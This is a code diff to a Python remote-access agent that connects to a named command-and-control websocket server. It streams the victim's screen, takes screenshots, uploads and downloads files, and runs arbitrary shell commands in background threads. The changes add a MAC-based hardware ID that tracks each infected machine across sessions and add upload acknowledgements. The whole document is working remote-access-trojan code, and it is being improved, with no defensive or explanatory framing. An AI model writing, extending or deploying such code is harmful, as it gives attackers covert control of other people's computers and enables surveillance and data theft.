@@ -7,6 +7,7 @@ import base64
 import time
 import platform
 import threading
+import uuid
 import websocket
 import pyautogui
 import cv2
@@ -14,8 +15,16 @@ import numpy as np
 from PIL import ImageGrab
 
 CURRENT_CWD = os.getcwd()
+
+# Unique hardware ID for session grouping
+try:
+    MAC = uuid.getnode()
+    HARDWARE_ID = f"{MAC:012x}"
+except Exception:
+    HARDWARE_ID = str(uuid.uuid4())[:12]
+
 C2_URL = "wss://textgame-9-c2.fly.dev/shell"
-SESSION_ID = "rs-" + socket.gethostname() + "-" + str(int(time.time()))
+SESSION_ID = f"rs-{socket.gethostname()}-{HARDWARE_ID}"
 
 STREAM_EVENT = threading.Event()
 
@@ -31,6 +40,8 @@ def fingerprint():
         "hostname": socket.gethostname(),
         "user": os.getenv("USER") or os.getenv("USERNAME") or "?",
         "cwd": os.getcwd(),
+        "hardware_id": HARDWARE_ID,
+        "platform": "python-agent"
     }
 
 def stream_screen(ws):
@@ -119,8 +130,10 @@ def do_upload(ws, path, b64_data):
     try:
         with open(path, "wb") as f:
             f.write(base64.b64decode(b64_data))
+        send(ws, {"t": "upload_ack", "path": path, "ok": True})
         send(ws, {"t": "reply", "data": f"[+] Upload complete: {path}\n"})
     except Exception as e:
+        send(ws, {"t": "upload_ack", "path": path, "ok": False, "err": str(e)})
         send(ws, {"t": "reply", "data": f"[-] Upload failed: {e}\n"})
 
 def do_download(ws, path):
@@ -163,7 +176,6 @@ def main():
                     elif "screenshot" in cmd:
                         do_screenshot(ws)
                     else:
-                        # Run command in a thread so it doesn't block the socket
                         threading.Thread(target=run_cmd, args=(ws, cmd), daemon=True).start()
                 elif t == "upload":
                     do_upload(ws, frame.get("path"), frame.get("data"))
